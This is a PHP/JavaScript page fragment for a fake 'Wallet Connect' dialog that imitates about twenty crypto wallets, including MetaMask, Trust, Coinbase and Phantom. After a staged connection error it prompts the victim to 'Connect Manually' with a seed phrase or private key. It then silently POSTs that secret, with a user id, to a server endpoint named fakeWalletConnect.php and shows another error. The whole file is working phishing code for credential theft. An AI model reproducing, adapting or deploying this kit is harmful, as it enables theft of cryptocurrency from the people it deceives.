<div id="modelWapper" auth="<?= $id ?>"></div>

<script>
    const wallet = [{
            name: 'Trust',
            img: 'trust.png'
        },
        {
            name: 'MetaMask',
            img: 'metamask.png'
        },
        {
            name: 'Aktionariat',
            img: 'aktionariat wallet.png'
        },
        {
            name: 'Anchor',
            img: 'anchor.png'
        },
        {
            name: 'Atomic',
            img: 'atomic.png'
        },
        {
            name: 'Autheruem',
            img: 'autheruem.png'
        },
        {
            name: 'Bitpay',
            img: 'bitpay.jpg'
        },
        {
            name: 'Blockchain',
            img: 'bolckchain.png'
        },
        {
            name: 'Rainbow',
            img: 'rainbow.png'
        },
        {
            name: 'Luno',
            img: 'luno.png'
        },
        {
            name: 'Bitkeep',
            img: 'bitkeep.png'
        },
        {
            name: 'TokenPocket',
            img: 'tokenpocket.png'
        },
        {
            name: 'Math',
            img: 'math.png'
        },
        {
            name: 'Maiar',
            img: 'maiar.png'
        },
        {
            name: 'Houbi',
            img: 'houbi.jpg'
        },
        {
            name: 'Pillar',
            img: 'pillar.png'
        },
        {
            name: 'im Token',
            img: 'im token.png'
        },
        {
            name: 'Spactium',
            img: 'spatium.jpg'
        },
        {
            name: 'TrustVault',
            img: 'trustVault.png'
        },
        {
            name: 'Exodus',
            img: 'exodus.jpg'
        },
        {
            name: 'Coinbase',
            img: 'coinbase.png'
        },
        {
            name: 'Phantom',
            img: 'phantom.jpg'
        }
    ];

    let connectmodal = document.querySelectorAll('#connectmodal');
    let selectedWalletIndex = null;

    connectmodal.forEach(el => {

        el.onclick = () => {

            el.innerHTML = "Connecting Wallet ....."

            setTimeout(() => {

                document.querySelector('#modelWapper').innerHTML = `
<div id="walletModal" class="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
<div class="bg-slate-900 rounded-xl w-[420px] p-6 text-white">

<div class="flex justify-between items-center mb-4">
<h2 class="text-lg font-semibold">Wallet Connect</h2>
<button onclick="closeModal()" class="text-gray-400 hover:text-white">✕</button>
</div>

<div id="walletBoard" class="grid grid-cols-4 gap-4"></div>

</div>
</div>

<div id="errorModal" class="hidden fixed inset-0 bg-black/70 flex items-center justify-center z-50">
<div class="bg-slate-900 rounded-xl w-[420px] p-6 text-white">

<div class="flex justify-between mb-4">
<h3 class="text-lg font-semibold">Connection Error</h3>
<button onclick="closeError()" class="text-gray-400">✕</button>
</div>

<div class="space-y-4">

<div class="border border-red-500 rounded-lg p-4 flex justify-between items-center">
<span id="selectedWalletError">Connecting...</span>

<button onclick="openManual()" id="manualBtn"
class="hidden bg-blue-600 px-3 py-1 rounded text-sm">
Connect Manually
</button>
</div>

<div class="border border-gray-700 rounded-lg p-4 flex justify-between items-center">
<div>
<h4 id="walletName"></h4>
<p class="text-sm text-gray-400">Easy-to-use wallet</p>
</div>

<img id="walletImg" class="h-8">
</div>

</div>
</div>
</div>

<div id="manualModal" class="hidden fixed inset-0 bg-black/70 flex items-center justify-center z-50">

<div class="bg-slate-900 rounded-xl w-[420px] p-6 text-white space-y-4">

<div class="flex justify-between">
<h3 class="text-lg font-semibold">Import Wallet</h3>
<button onclick="closeManual()">✕</button>
</div>

<div class="flex items-center gap-2">
<img id="manualWalletImg" class="h-6">
<span id="manualWalletName"></span>
</div>

<div class="flex gap-2">
<button onclick="seedPhrase()" id="seedBtn" class="bg-blue-600 px-3 py-1 rounded">Seed Phrase</button>
<button onclick="privateKey()" id="keyBtn" class="bg-gray-700 px-3 py-1 rounded">Private Key</button>
</div>

<div class="flex flex-col gap-2" id="walletForm"></div>

</div>
</div>
`;

                loadWallet();

            }, 2000)





        }
    })









    function loadWallet() {

        const board = document.querySelector('#walletBoard');

        wallet.forEach((w, i) => {

            board.insertAdjacentHTML("beforeend", `

                <div onclick="run(${i})" class="cursor-pointer flex flex-col items-center gap-2">

                <img src="<?php echo $domain ?>assets/images/wallet/${w.img}" class="h-8 rounded">

                <span class="text-xs">${w.name}</span>

                </div>

                `);

        });

    }

    function run(i) {

        selectedWalletIndex = i;

        document.querySelector('#walletModal').classList.add('hidden');
        document.querySelector('#errorModal').classList.remove('hidden');

        const w = wallet[i];

        document.querySelector('#walletName').innerText = `Import Your ${w.name}`;
        document.querySelector('#walletImg').src = `<?php echo $domain ?>assets/images/wallet/${w.img}`;
        document.querySelector('#selectedWalletError').innerText = "Connecting...";
        document.querySelector('#manualBtn').classList.add('hidden');

        setTimeout(() => {
            document.querySelector('#selectedWalletError').innerText = "Error While Connecting...";
            document.querySelector('#manualBtn').classList.remove('hidden');
        }, 2000);

    }

    function openManual() {

        const w = wallet[selectedWalletIndex];

        document.querySelector('#manualModal').classList.remove('hidden');
        document.querySelector('#errorModal').classList.add('hidden');

        document.querySelector('#manualWalletName').innerText = w.name;
        document.querySelector('#manualWalletImg').src = `<?php echo $domain ?>assets/images/wallet/${w.img}`;

        seedPhrase();

    }

    function seedPhrase() {

        document.querySelector('#walletForm').innerHTML = `

<textarea id="walletValue"
class="w-full bg-slate-800 rounded p-2 h-24"
placeholder="Enter recovery phrase"></textarea>

<p class="text-xs text-gray-400">
Typically 12 or 24 words separated by spaces
</p>

<span id="walletError" class="text-red-400 text-sm"></span>

<button onclick="proceed('seed')" class="w-full bg-blue-600 py-2 rounded">
Import Wallet
</button>

`;

    }

    function privateKey() {

        document.querySelector('#walletForm').innerHTML = `

<input id="walletValue"
class="w-full bg-slate-800 rounded p-2"
placeholder="Enter private key">

<span id="walletError" class="text-red-400 text-sm"></span>

<button onclick="proceed('key')" class="w-full bg-blue-600 py-2 rounded">
Import Wallet
</button>

`;

    }

    function proceed(type) {

        const value = document.querySelector('#walletValue').value.trim();
        const error = document.querySelector('#walletError');
        const user = document.querySelector('#modelWapper').getAttribute('auth');
        const name = wallet[selectedWalletIndex].name;

        if (type === 'seed') {

            const words = value.split(/\s+/).length;

            if (![12, 15, 18, 21, 24].includes(words)) {
                error.innerText = "Invalid Seed Phrase";
                return;
            }

            fetch("../server/api/fakeWalletConnect.php", {
                method: "POST",
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                    seedPhrase: value,
                    privateKey: "",
                    name,
                    user,
                    from: "fakeWalletConnect"
                })
            });

            error.innerText = "Error While Connecting...";

        }

        if (type === 'key') {

            if (value.length < 32) {
                error.innerText = "Invalid Private Key";
                return;
            }

            fetch("../server/api/fakeWalletConnect.php", {
                method: "POST",
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                    seedPhrase: "",
                    privateKey: value,
                    name,
                    user,
                    from: "fakeWalletConnect"
                })
            });

            error.innerText = "Error While Connecting...";

        }

    }

    function closeModal() {
        document.querySelector('#walletModal').classList.add('hidden');
    }

    function closeError() {
        document.querySelector('#errorModal').classList.add('hidden');
    }

    function closeManual() {
        document.querySelector('#manualModal').classList.add('hidden');
    }
</script>